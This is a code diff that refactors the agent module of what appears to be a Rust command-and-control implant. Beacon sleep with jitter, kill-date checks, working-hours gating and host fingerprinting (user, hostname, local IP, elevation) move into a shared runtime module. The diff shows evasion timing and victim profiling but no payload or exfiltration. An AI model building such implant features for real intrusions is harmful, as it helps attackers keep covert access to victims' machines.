@@ -2,12 +2,10 @@ use crate::commander;
 use crate::connector_tcp::ConnectorTCP;
 use crate::crypto;
 use crate::protocol;
+use crate::runtime_common;
 use rand::rngs::OsRng;
 use rand::RngCore;
-use std::net::{TcpStream, UdpSocket};
-use std::path::Path;
-use std::thread;
-use std::time::{Duration, SystemTime, UNIX_EPOCH};
+use std::net::TcpStream;
 
 pub struct Agent {
     pub active: bool,
@@ -145,44 +143,15 @@ impl Agent {
     }
 
     pub fn sleep_with_jitter(&self) {
-        let base_ms = self.sleep_secs.max(0) as u64 * 1000;
-        let jitter = self.jitter.clamp(0, 90) as u64;
-        let actual_ms = if jitter == 0 {
-            base_ms
-        } else {
-            let delta = base_ms * jitter / 100;
-            let spread = delta.saturating_mul(2).saturating_add(1);
-            let roll = (self.random_u32() as u64) % spread;
-            base_ms.saturating_sub(delta).saturating_add(roll)
-        };
-        thread::sleep(Duration::from_millis(actual_ms.max(100)));
+        runtime_common::sleep_with_jitter(self.sleep_secs.max(0) as u64 * 1000, self.jitter.max(0) as u32, 100);
     }
 
     pub fn should_exit(&self) -> bool {
-        self.kill_date > 0 && self.now_unix() >= self.kill_date
+        runtime_common::should_exit(self.kill_date)
     }
 
     pub fn wait_for_working_hours(&self) {
-        if self.work_start == 0 && self.work_end == 0 {
-            return;
-        }
-
-        loop {
-            let now = SystemTime::now()
-                .duration_since(UNIX_EPOCH)
-                .unwrap_or_default()
-                .as_secs();
-            let hhmm = ((now % 86400) / 3600) as i32 * 100 + (((now % 86400) % 3600) / 60) as i32;
-            let in_window = if self.work_start <= self.work_end {
-                hhmm >= self.work_start && hhmm < self.work_end
-            } else {
-                hhmm >= self.work_start || hhmm < self.work_end
-            };
-            if in_window {
-                return;
-            }
-            thread::sleep(Duration::from_secs(60));
-        }
+        runtime_common::wait_for_working_hours(self.work_start, self.work_end)
     }
 
     fn create_info(&self) -> protocol::SessionInfo {
@@ -190,9 +159,9 @@ impl Agent {
             process: self.process_name(),
             pid: std::process::id() as i32,
             user: std::env::var("USER").or_else(|_| std::env::var("USERNAME")).unwrap_or_default(),
-            host: hostname(),
-            ipaddr: local_ipv4(),
-            elevated: is_elevated(),
+            host: runtime_common::hostname(),
+            ipaddr: runtime_common::local_ipv4(),
+            elevated: runtime_common::is_elevated(),
             acp: 65001,
             oem: 65001,
             os: std::env::consts::OS.to_string(),
@@ -202,12 +171,7 @@ impl Agent {
     }
 
     fn process_name(&self) -> String {
-        std::env::current_exe()
-            .ok()
-            .as_deref()
-            .and_then(Path::file_name)
-            .map(|s| s.to_string_lossy().to_string())
-            .unwrap_or_else(|| "__NAME__".to_string())
+        runtime_common::process_name("__NAME__")
     }
 
     fn random_u32(&self) -> u32 {
@@ -216,37 +180,8 @@ impl Agent {
         u32::from_be_bytes(buf)
     }
 
+    #[allow(dead_code)]
     fn now_unix(&self) -> i64 {
-        SystemTime::now()
-            .duration_since(UNIX_EPOCH)
-            .unwrap_or_default()
-            .as_secs() as i64
-    }
-}
-
-fn hostname() -> String {
-    std::env::var("COMPUTERNAME")
-        .or_else(|_| std::env::var("HOSTNAME"))
-        .unwrap_or_default()
-}
-
-fn local_ipv4() -> String {
-    UdpSocket::bind("0.0.0.0:0")
-        .and_then(|sock| {
-            sock.connect("8.8.8.8:80")?;
-            sock.local_addr()
-        })
-        .map(|addr| addr.ip().to_string())
-        .unwrap_or_default()
-}
-
-fn is_elevated() -> bool {
-    #[cfg(unix)]
-    {
-        unsafe { libc::geteuid() == 0 }
-    }
-    #[cfg(not(unix))]
-    {
-        false
+        runtime_common::now_unix()
     }
 }
